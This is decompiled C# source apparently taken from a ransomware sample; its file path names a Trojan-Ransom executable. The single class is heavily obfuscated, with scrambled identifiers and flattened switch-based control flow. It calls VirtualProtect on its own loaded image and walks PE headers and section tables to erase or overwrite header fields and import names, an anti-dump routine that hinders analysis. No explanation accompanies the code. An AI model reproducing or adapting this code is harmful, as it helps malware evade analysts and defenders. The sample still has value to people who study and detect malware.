// Decompiled with JetBrains decompiler
// Type: ﵣ릉縟ꌟ⤴㝰�唊
// Assembly: mtrl, Version=5.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 591BD174-6BA7-4AF8-A4DB-5D88FD31BDF3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-2c01a4b5df598caa723ca49a0e4b85d0a6bc07036550fe1bdc6fe8c7ff4495d2.exe

using System;
using System.Runtime.InteropServices;

internal static class ﵣ릉縟ꌟ\u2934㝰\uFFFD唊
{
  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  private static extern unsafe bool \uF614\uEE13䵯퉔\uF626硜瓙鉹(
    byte* lpAddress,
    int dwSize,
    uint flNewProtect,
    out uint lpflOldProtect);

  public static unsafe void \u26A8캢ꕿ\uF5DA쵾螐竳㬓()
  {
    byte* hinstance = (byte*) (void*) Marshal.GetHINSTANCE(typeof (ﵣ릉縟ꌟ\u2934㝰\uFFFD唊).Module);
    int num1 = 5 - ~(-(8 - 5) - -91);
    while (true)
    {
      byte* numPtr1;
      uint lpflOldProtect;
      byte* lpAddress1;
      uint num2;
      uint[] numArray1;
      int index1;
      uint[] numArray2;
      uint[] numArray3;
      int index2;
      byte* lpAddress2;
      byte* numPtr2;
      int index3;
      int num3;
      do
      {
        byte* numPtr3;
        byte* lpAddress3;
        int num4;
        int index4;
        ushort length;
        uint num5;
        int index5;
        ushort num6;
        int num7;
        uint num8;
        byte* lpAddress4;
        int index6;
        byte* lpAddress5;
        int index7;
        byte* lpAddress6;
        int index8;
        byte* numPtr4;
        uint num9;
        int index9;
        byte* numPtr5;
        int num10;
        do
        {
          int num11;
          int num12;
          do
          {
            uint num13;
            ushort num14;
            int index10;
            int num15;
            do
            {
              byte* numPtr6;
              uint num16;
              int num17;
              int num18;
              do
              {
                int num19;
                int num20;
                int num21;
                do
                {
                  int num22;
                  int num23;
                  int num24;
                  do
                  {
                    byte* numPtr7;
                    int num25;
                    int num26;
                    do
                    {
                      int num27;
                      int num28;
                      do
                      {
                        switch (num1)
                        {
                          case 1:
                            *(int*) numPtr3 = 1866691662;
                            num1 = -(-32 - -9);
                            continue;
                          case 2:
                            ﵣ릉縟ꌟ\u2934㝰\uFFFD唊.\uF614\uEE13䵯퉔\uF626硜瓙鉹(numPtr1, 8, 64U, out lpflOldProtect);
                            num1 = -~~-4;
                            continue;
                          case 3:
                            lpAddress1 = hinstance + (int) *(uint*) (lpAddress3 + 8);
                            num1 = ~-21 - ~6;
                            continue;
                          case 4:
                            Marshal.Copy(new byte[8], 0, (IntPtr) (void*) numPtr1, 8);
                            num1 = -(~9 - (114 - (8 + (3 - 2))));
                            continue;
                          case 5:
                            if (num2 < numArray1[index1] + numArray2[index1])
                            {
                              num2 = num2 - numArray1[index1] + numArray3[index1];
                              goto label_95;
                            }
                            else
                              goto label_130;
                          case 6:
                            Marshal.Copy(new byte[8], 0, (IntPtr) (void*) numPtr1, 8);
                            num1 = 103 + (~8 + ~9);
                            continue;
                          case 7:
                            index2 = 0;
                            num1 = -6 - (~-6 - 37) - 7;
                            continue;
                          case 8:
                            *(int*) lpAddress1 = 0;
                            byte* numPtr8 = lpAddress1 + 4;
                            *(int*) numPtr8 = 0;
                            lpAddress1 = numPtr8 + 4;
                            num4 = 0;
                            num1 = ~-10 - (2 - 9) - 6;
                            continue;
                          case 9:
                            num27 = (int) numArray1[index1];
                            num28 = (int) num2;
                            num1 = ~-95 - -4 - 5;
                            continue;
                          case 10:
                            goto label_14;
                          case 11:
                            goto label_76;
                          case 12:
                            goto label_15;
                          case 13:
                            goto label_17;
                          case 14:
                            goto label_18;
                          case 15:
                            goto label_20;
                          case 16:
                            goto label_22;
                          case 17:
                            goto label_68;
                          case 18:
                            goto label_25;
                          case 19:
                            goto label_26;
                          case 20:
                            goto label_28;
                          case 21:
                            goto label_29;
                          case 22:
                            goto label_31;
                          case 23:
                            goto label_33;
                          case 24:
                            goto label_34;
                          case 25:
                            goto label_37;
                          case 26:
                            goto label_39;
                          case 27:
                            goto label_40;
                          case 28:
                          case 75:
                            goto label_41;
                          case 29:
                            goto label_44;
                          case 30:
                          case 32:
                            goto label_47;
                          case 31:
                            goto label_46;
                          case 33:
                            goto label_51;
                          case 34:
                            goto label_52;
                          case 35:
                            goto label_53;
                          case 36:
                            goto label_54;
                          case 37:
                            goto label_55;
                          case 38:
                            goto label_56;
                          case 39:
                            goto label_57;
                          case 40:
                            goto label_58;
                          case 41:
                            goto label_59;
                          case 42:
                            goto label_60;
                          case 43:
                            goto label_61;
                          case 44:
                            goto label_63;
                          case 45:
                            goto label_64;
                          case 46:
                            goto label_65;
                          case 47:
                            goto label_66;
                          case 48:
                            goto label_67;
                          case 49:
                            goto label_70;
                          case 50:
                            goto label_72;
                          case 51:
                            goto label_73;
                          case 52:
                            goto label_74;
                          case 53:
                            goto label_78;
                          case 54:
                            goto label_79;
                          case 55:
                            goto label_80;
                          case 56:
                            goto label_81;
                          case 57:
                            goto label_82;
                          case 58:
                            goto label_83;
                          case 59:
                            goto label_84;
                          case 60:
                            goto label_85;
                          case 61:
                          case 67:
                          case 95:
                            goto label_48;
                          case 62:
                            goto label_86;
                          case 63:
                            goto label_88;
                          case 64:
                            goto label_89;
                          case 65:
                            goto label_90;
                          case 66:
                            goto label_91;
                          case 68:
                            goto label_42;
                          case 69:
                            goto label_93;
                          case 70:
                            if (index1 < (int) length)
                              goto case 9;
                            else
                              goto label_95;
                          case 71:
                            goto label_98;
                          case 72:
                            goto label_99;
                          case 73:
                            goto label_100;
                          case 74:
                            goto label_102;
                          case 76:
                            goto label_104;
                          case 77:
                            goto label_105;
                          case 78:
                            goto label_107;
                          case 79:
                            if (index3 < (int) length)
                              goto case 2;
                            else
                              goto label_110;
                          case 80:
                            goto label_114;
                          case 81:
                            goto label_115;
                          case 82:
                            goto label_116;
                          case 83:
                            goto label_117;
                          case 84:
                            goto label_118;
                          case 85:
                            goto label_119;
                          case 86:
                          case 102:
                            goto label_121;
                          case 87:
                            goto label_123;
                          case 88:
                            goto label_125;
                          case 89:
                            goto label_126;
                          case 90:
                            goto label_127;
                          case 91:
                            goto label_128;
                          case 92:
                            goto label_129;
                          case 93:
                            goto label_130;
                          case 94:
                            goto label_131;
                          case 96:
                            goto label_132;
                          case 97:
                            goto label_133;
                          case 98:
                            goto label_135;
                          case 99:
                            goto label_137;
                          case 100:
                            goto label_139;
                          case 101:
                            goto label_140;
                          case 103:
                            goto label_144;
                          case 104:
                            goto label_142;
                          case 105:
                            goto label_143;
                          case 106:
                            goto label_146;
                          case 107:
                            goto label_147;
                          case 108:
                            goto label_148;
                          case 109:
                            goto label_113;
                          case 110:
                            goto label_150;
                          case 111:
                            goto label_151;
                          case 112:
                            goto label_153;
                          case 113:
                            goto label_154;
                          case 114:
                            goto label_155;
                          case 115:
                            goto label_156;
                          case 116:
                            goto label_157;
                          case 117:
                            goto label_159;
                          case 118:
                            goto label_160;
                          default:
                            numPtr6 = hinstance + (int) *(uint*) (numPtr1 - 120);
                            num1 = --50 - (5 - 3) + 7;
                            continue;
                        }
                      }
                      while ((uint) num27 >= (uint) num28);
                      num1 = --(17 + (-5 + ~6));
                      continue;
label_14:
                      num1 = ~~--21;
                      continue;
label_15:
                      if (index4 >= (int) length)
                      {
                        num1 = 89 + (9 - 9 + (3 - 5)) - -7 + 4;
                        continue;
                      }
                      goto label_96;
label_17:
                      *(int*) lpAddress2 = 0;
                      num1 = ~~~-77;
                      continue;
label_18:
                      ++lpAddress2;
                      if (*lpAddress2 == (byte) 0)
                      {
                        lpAddress2 += 2;
                        num1 = --97 - 2;
                        continue;
                      }
                      goto label_83;
label_20:
                      if (typeof (ﵣ릉縟ꌟ\u2934㝰\uFFFD唊).Module.FullyQualifiedName != "<Unknown>")
                      {
                        num1 = ~6 - (-103 - ~~8);
                        continue;
                      }
                      goto label_43;
label_22:
                      ++lpAddress1;
                      goto label_30;
label_25:
                      numPtr3 = stackalloc byte[11];
                      num1 = 2 - (~3 - -5);
                      continue;
label_26:
                      num25 = index2;
                      num26 = (int) length;
                      num1 = 6 + 7 - (-11 - (6 - 7 - (6 + 4))) + 9;
                      continue;
label_67:
                      ++num19;
label_68:
                      if (num19 < (int) length)
                      {
                        ﵣ릉縟ꌟ\u2934㝰\uFFFD唊.\uF614\uEE13䵯퉔\uF626硜瓙鉹(numPtr1, 8, 64U, out lpflOldProtect);
                        num1 = -(-17 - ~(4 + 3) - ~2);
                        continue;
                      }
                      goto label_69;
label_95:
                      num9 = *(uint*) numPtr5 + 2U;
                      index4 = 0;
                      goto label_15;
label_160:
                      *lpAddress1 = (byte) 0;
                      numPtr7 = lpAddress1 + 1;
                      if (*numPtr7 != (byte) 0)
                      {
                        *numPtr7 = (byte) 0;
                        lpAddress1 = numPtr7 + 1;
                        if (*lpAddress1 != (byte) 0)
                        {
                          *lpAddress1 = (byte) 0;
                          ++lpAddress1;
                          num1 = ~7 - -109;
                        }
                        else
                          goto label_163;
                      }
                      else
                        goto label_161;
                    }
                    while (num25 < num26);
                    num1 = --(8 - -74);
                    continue;
label_28:
                    num5 = *(uint*) numPtr2;
                    num1 = -~--6;
                    continue;
label_29:
                    if (num4 < 8)
                      goto label_146;
label_30:
                    ++num22;
                    num1 = ~(~-2 - 33) - 3;
                    continue;
label_31:
                    num23 = (int) numArray1[index2];
                    num24 = (int) num5;
                    num1 = --116 - 8;
                    continue;
label_82:
                    lpAddress1 += 3;
                    goto label_30;
label_161:
                    lpAddress1 = numPtr7 + 2;
                    goto label_30;
                  }
                  while ((uint) num23 >= (uint) num24);
                  num1 = -(-33 - (8 + 2 + (5 + 5))) - 4;
                  continue;
label_33:
                  *(int*) (numPtr3 + 4) = 1852404846;
                  *(short*) (numPtr3 + 8) = (short) 25973;
                  num1 = -(-37 - 7) - 7;
                  continue;
label_34:
                  ++index5;
label_35:
                  if (index5 >= 11)
                  {
                    num1 = --101 - 9;
                    continue;
                  }
                  goto label_136;
label_37:
                  if (*lpAddress2 == (byte) 0)
                  {
                    lpAddress2 += 3;
                    num1 = -~(-5 + (5 + 4) - -56);
                    continue;
                  }
                  goto label_132;
label_39:
                  numPtr1 += 40;
                  ++index3;
                  num1 = 62 - (~8 + ~7);
                  continue;
label_40:
                  *(int*) lpAddress3 = 0;
                  *(int*) (lpAddress3 + 4) = 0;
                  num1 = ~-6 - -20 - ~7;
                  continue;
label_41:
                  if (num22 >= (int) num6)
                    return;
                  goto label_103;
label_43:
                  num16 = *(uint*) (numPtr1 - 16);
                  num1 = 9 - (-7 - (20 + ~(7 - 6)));
                  continue;
label_44:
                  lpAddress1 += 2;
                  num22 = 0;
                  num1 = 9 - -(~4 - (8 - 3) - -76);
                  continue;
label_46:
                  ++lpAddress1;
                  num1 = ~~5 - -76 - -5 - 8;
                  continue;
label_47:
                  if (num7 < 8)
                  {
                    ﵣ릉縟ꌟ\u2934㝰\uFFFD唊.\uF614\uEE13䵯퉔\uF626硜瓙鉹(lpAddress2, 4, 64U, out lpflOldProtect);
                    *lpAddress2 = (byte) 0;
                    num1 = -~--112;
                    continue;
                  }
label_48:
                  int num29;
                  ++num29;
label_49:
                  num20 = num29;
                  ushort num30;
                  num21 = (int) num30;
                  num1 = --8 - -30;
                  continue;
label_135:
                  ﵣ릉縟ꌟ\u2934㝰\uFFFD唊.\uF614\uEE13䵯퉔\uF626硜瓙鉹(hinstance + (int) num2, 11, 64U, out lpflOldProtect);
                  index5 = 0;
                  goto label_35;
label_137:
                  num9 = num9 - numArray1[index4] + numArray3[index4];
                  goto label_135;
label_150:
                  byte* numPtr9 = lpAddress2 + 2;
                  num30 = (ushort) *numPtr9;
                  lpAddress2 = numPtr9 + 2;
                  num29 = 0;
                  goto label_49;
                }
                while (num20 < num21);
                num1 = ~(-75 - (-7 - -5) - (5 - 9));
                continue;
label_51:
                *(int*) (lpAddress3 + 8) = 0;
                *(int*) (lpAddress3 + 12) = 0;
                ﵣ릉縟ꌟ\u2934㝰\uFFFD唊.\uF614\uEE13䵯퉔\uF626硜瓙鉹(lpAddress1, 4, 64U, out lpflOldProtect);
                *(int*) lpAddress1 = 0;
                num1 = ~(~63 - ~6);
                continue;
label_52:
                num13 = *(uint*) (numPtr1 - 120);
                numArray1 = new uint[(int) length];
                num1 = ~-42 - 7 + 6;
                continue;
label_53:
                lpAddress2 = hinstance + (int) num8;
                ﵣ릉縟ꌟ\u2934㝰\uFFFD唊.\uF614\uEE13䵯퉔\uF626硜瓙鉹(lpAddress2, 4, 64U, out lpflOldProtect);
                num1 = ~(-6 + ~6 - 76 - (4 - 2));
                continue;
label_54:
                ++lpAddress2;
                ++num7;
                num1 = -8 - (~~9 - 53) - 4;
                continue;
label_55:
                numPtr3[10] = (byte) 0;
                num1 = ~(~11 + (3 - 7));
                continue;
label_56:
                ﵣ릉縟ꌟ\u2934㝰\uFFFD唊.\uF614\uEE13䵯퉔\uF626硜瓙鉹(lpAddress2, 8, 64U, out lpflOldProtect);
                *(int*) lpAddress2 = 0;
                lpAddress2 += 4;
                num1 = ~-~-15;
                continue;
label_57:
                num14 = *(ushort*) numPtr1;
                num1 = ~~--65;
                continue;
label_58:
                numArray2 = new uint[(int) length];
                num1 = 2 - -(46 - ~~2);
                continue;
label_59:
                ﵣ릉縟ꌟ\u2934㝰\uFFFD唊.\uF614\uEE13䵯퉔\uF626硜瓙鉹(lpAddress4, 11, 64U, out lpflOldProtect);
                num1 = --39 - ~4 + 9;
                continue;
label_60:
                ++index6;
                num1 = --89 - 8 - 4;
                continue;
label_61:
                if (numArray1[index6] < num13 && num13 < numArray1[index6] + numArray2[index6])
                {
                  num13 = num13 - numArray1[index6] + numArray3[index6];
                  num1 = --55 - ~6 - 3;
                  continue;
                }
                goto label_60;
label_63:
                num19 = 0;
                num1 = 6 - 9 - (-9 - 6) + 5;
                continue;
label_64:
                byte* numPtr10 = lpAddress2 + 12;
                lpAddress2 = (byte*) ((ulong) ((uint) (numPtr10 + (int) *(uint*) numPtr10) + 7U) & 18446744073709551612UL);
                num1 = 4 - (~104 - (7 - 6));
                continue;
label_65:
                numArray3 = new uint[(int) length];
                num1 = 4 - ~(60 - (4 - (4 + 7)));
                continue;
label_66:
                numPtr1 += 6;
                num1 = ~(-115 - ~(3 + 6)) - 4;
                continue;
label_69:
                num1 = ----66;
                continue;
label_70:
                num17 = (int) num5;
                num18 = (int) numArray1[index2] + (int) numArray2[index2];
                num1 = 9 - (-88 - (9 + (4 - 5)) + ~2);
              }
              while ((uint) num17 >= (uint) num18);
              num1 = 5 - (-44 - 5);
              continue;
label_72:
              ﵣ릉縟ꌟ\u2934㝰\uFFFD唊.\uF614\uEE13䵯퉔\uF626硜瓙鉹(lpAddress5, 72, 64U, out lpflOldProtect);
              num1 = ~-(91 - 2);
              continue;
label_73:
              numPtr2 = hinstance + (int) num13;
              num1 = ~-23 + -2;
              continue;
label_74:
              num16 = num16 - numArray1[index10] + numArray3[index10];
              goto label_77;
label_76:
              if (index10 < (int) length)
                goto label_157;
label_77:
              lpAddress5 = hinstance + (int) num16;
              num1 = ~(6 + 6) - -63;
              continue;
label_78:
              index7 = 0;
              num1 = -(~(2 - 8) - 99 - (2 + 6));
              continue;
label_79:
              num5 = num5 - numArray1[index2] + numArray3[index2];
              num1 = ~~--82;
              continue;
label_80:
              byte* numPtr11 = hinstance + (int) *(uint*) numPtr6;
              lpAddress6 = hinstance + (int) *(uint*) (numPtr6 + 12);
              lpAddress4 = hinstance + (int) *(uint*) numPtr11 + 2;
              num1 = -(-58 - ~(3 - 5)) + 5;
              continue;
label_81:
              byte* numPtr12 = lpAddress1 + 12;
              lpAddress1 = numPtr12 + (int) *(uint*) numPtr12;
              num1 = ~-73 - ~8;
              continue;
label_83:
              *lpAddress2 = (byte) 0;
              num1 = 6 - (5 - 117) - 7;
              continue;
label_84:
              num1 = 32 - (-8 - (4 + 7));
              continue;
label_85:
              index8 = 0;
              num1 = ~(9 - 2 - (8 + 2 - ~2 - -98));
              continue;
label_86:
              num15 = (int) *(uint*) (numPtr1 - 120);
              num1 = ~(-29 - (7 - 3 - -8)) + 4;
              continue;
label_157:
              if (numArray1[index10] >= num16 || num16 >= numArray1[index10] + numArray2[index10])
              {
                ++index10;
                goto label_76;
              }
              else
                goto label_158;
            }
            while (num15 == 0);
            goto label_87;
label_42:
            return;
label_87:
            num1 = ~7 - -17 - 9;
            continue;
label_88:
            numPtr4[10] = (byte) 0;
            num1 = --28 + (4 - 8) - 6;
            continue;
label_89:
            ﵣ릉縟ꌟ\u2934㝰\uFFFD唊.\uF614\uEE13䵯퉔\uF626硜瓙鉹(lpAddress6, 11, 64U, out lpflOldProtect);
            num1 = -(~67 - ~7);
            continue;
label_90:
            numPtr1 = numPtr1 + 4 + (int) num14;
            numPtr4 = stackalloc byte[11];
            *(int*) numPtr4 = 1818522734;
            *(int*) (numPtr4 + 4) = 1818504812;
            *(short*) (numPtr4 + 8) = (short) 108;
            num1 = ~-73 - (4 + 5);
            continue;
label_91:
            ﵣ릉縟ꌟ\u2934㝰\uFFFD唊.\uF614\uEE13䵯퉔\uF626硜瓙鉹(lpAddress3, 72, 64U, out lpflOldProtect);
            num1 = 19 + 6 - (8 + 7) - 7;
            continue;
label_93:
            (hinstance + (int) num9)[index9] = numPtr3[index9];
            ++index9;
            num1 = ~(~68 + -5);
            continue;
label_96:
            if (numArray1[index4] < num9)
            {
              num1 = 91 - (3 - (3 + 6));
              continue;
            }
            goto label_138;
label_98:
            *(int*) (lpAddress5 + 8) = 0;
            *(int*) (lpAddress5 + 12) = 0;
            num1 = ~(~3 + 5 - 35 - (5 - 3));
            continue;
label_99:
            index3 = 0;
            num1 = 73 + (8 - -9) - (5 + 2) - 4;
            continue;
label_100:
            if (index9 < 11)
              goto label_93;
label_101:
            index10 = 0;
            num1 = ~~7 + 4;
            continue;
label_102:
            num1 = 3 + 9 + 5 - -53 - (5 - 8);
            continue;
label_103:
            ﵣ릉縟ꌟ\u2934㝰\uFFFD唊.\uF614\uEE13䵯퉔\uF626硜瓙鉹(lpAddress1, 8, 64U, out lpflOldProtect);
            num1 = 4 + ~~4;
            continue;
label_104:
            lpAddress2 += 4;
            num1 = --94 + (3 - 3) - 5;
            continue;
label_105:
            num11 = index6;
            num12 = (int) length;
            num1 = 6 - ~~-37;
            continue;
label_110:
            if (num13 == 0U)
              goto label_101;
            else
              goto label_111;
label_151:
            ++lpAddress2;
            if (*lpAddress2 != (byte) 0)
            {
              *lpAddress2 = (byte) 0;
              num1 = ~~(--3 - -33);
            }
            else
              goto label_152;
          }
          while (num11 < num12);
          num1 = -~(9 - -41);
          continue;
label_107:
          num10 = (int) *lpAddress1;
          num1 = ~-(~-4 - -116);
        }
        while (num10 != 0);
        num1 = ----57;
        continue;
label_111:
        num1 = 89 - ~(5 - 4);
        continue;
label_112:
        int index11;
        ++index11;
label_113:
        if (index11 < (int) length)
          goto label_123;
label_114:
        *(int*) lpAddress5 = 0;
        *(int*) (lpAddress5 + 4) = 0;
        num1 = ~-78 - 6;
        continue;
label_115:
        lpAddress1 = (byte*) ((ulong) ((uint) lpAddress1 + 7U) & 18446744073709551612UL) + 2;
        num6 = (ushort) *lpAddress1;
        num1 = --(-(8 - 6) - -31);
        continue;
label_116:
        numPtr5 = hinstance + (int) num5;
        num1 = 8 + -3 - -121 - (5 + 5) - 9;
        continue;
label_117:
        index9 = 0;
        num1 = 9 - ~--64;
        continue;
label_118:
        numPtr1 += 40;
        num1 = 53 - --5;
        continue;
label_119:
        if (num8 < numArray1[index11] + numArray2[index11])
        {
          num8 = num8 - numArray1[index11] + numArray3[index11];
          num1 = --75 + 5;
          continue;
        }
        goto label_112;
label_121:
        if (index7 >= 11)
        {
          num1 = -(-47 + (8 - 5));
          continue;
        }
        lpAddress4[index7] = numPtr3[index7];
        ++index7;
        num1 = 85 - -(7 - 6);
        continue;
label_123:
        if (numArray1[index11] < num8)
        {
          num1 = ~(-78 - 4 + -4);
          continue;
        }
        goto label_112;
label_125:
        num8 = *(uint*) (lpAddress5 + 8);
        index11 = 0;
        num1 = -(~109 + (5 - 4));
        continue;
label_126:
        num7 = 0;
        num1 = ~-30 - (3 + 4) + 8;
        continue;
label_127:
        *(int*) lpAddress2 = 0;
        num1 = ~-(55 - -~8);
        continue;
label_128:
        index6 = 0;
        num1 = --~-78;
        continue;
label_129:
        ﵣ릉縟ꌟ\u2934㝰\uFFFD唊.\uF614\uEE13䵯퉔\uF626硜瓙鉹(hinstance + (int) num9, 11, 64U, out lpflOldProtect);
        num1 = ~---84;
        continue;
label_130:
        ++index1;
        num1 = --70 - ~5 - 6;
        continue;
label_131:
        byte* numPtr13 = hinstance + 60;
        numPtr1 = hinstance + (int) *(uint*) numPtr13;
        num1 = ~~(44 - ~(5 - 3));
        continue;
label_132:
        *lpAddress2 = (byte) 0;
        num1 = 2 - (18 - (5 + 2 + (8 + 8)) + -7);
        continue;
label_133:
        if (num9 < numArray1[index4] + numArray2[index4])
        {
          num1 = ~~(103 - 4);
          continue;
        }
        goto label_138;
label_136:
        (hinstance + (int) num2)[index5] = numPtr4[index5];
        num1 = ~(2 + 6 - (37 - 4));
        continue;
label_138:
        ++index4;
        num1 = ~---13;
        continue;
label_139:
        length = *(ushort*) numPtr1;
        numPtr1 += 14;
        num1 = --29 - ~9;
        continue;
label_140:
        ++num4;
        num1 = ~(2 - ~9 - 28) + 6;
        continue;
label_142:
        lpAddress3 = hinstance + (int) *(uint*) (numPtr1 - 16);
        num1 = -~--61;
        continue;
label_143:
        lpAddress6[index8] = numPtr4[index8];
        ++index8;
label_144:
        num3 = index8;
        num1 = -7 - (9 - 4) - -117;
      }
      while (num3 < 11);
      num1 = 44 + (4 - 9 + (5 - 3));
      continue;
label_146:
      ﵣ릉縟ꌟ\u2934㝰\uFFFD唊.\uF614\uEE13䵯퉔\uF626硜瓙鉹(lpAddress1, 4, 64U, out lpflOldProtect);
      *lpAddress1 = (byte) 0;
      num1 = 39 - ~-9;
      continue;
label_147:
      num2 = *(uint*) (numPtr2 + 12);
      index1 = 0;
      num1 = 133 - (4 + 8 - -7) - ~7 - 5;
      continue;
label_148:
      ++index2;
      num1 = --20 - ~3 - 5;
      continue;
label_152:
      num1 = ~---115;
      continue;
label_153:
      numArray3[index3] = *(uint*) (numPtr1 + 20);
      num1 = ~(-(8 + 4) - 12 + ~2);
      continue;
label_154:
      ++lpAddress2;
      num1 = -5 - -36 - 6;
      continue;
label_155:
      ++lpAddress2;
      num1 = ~(8 + 4) - -80;
      continue;
label_156:
      numArray1[index3] = *(uint*) (numPtr1 + 12);
      numArray2[index3] = *(uint*) (numPtr1 + 8);
      num1 = ~~106 + 6;
      continue;
label_158:
      num1 = -(-43 - 5) + 4;
      continue;
label_159:
      num1 = ~(~62 - 8);
      continue;
label_163:
      num1 = -1 - (~6 - (2 + 8));
    }
  }
}
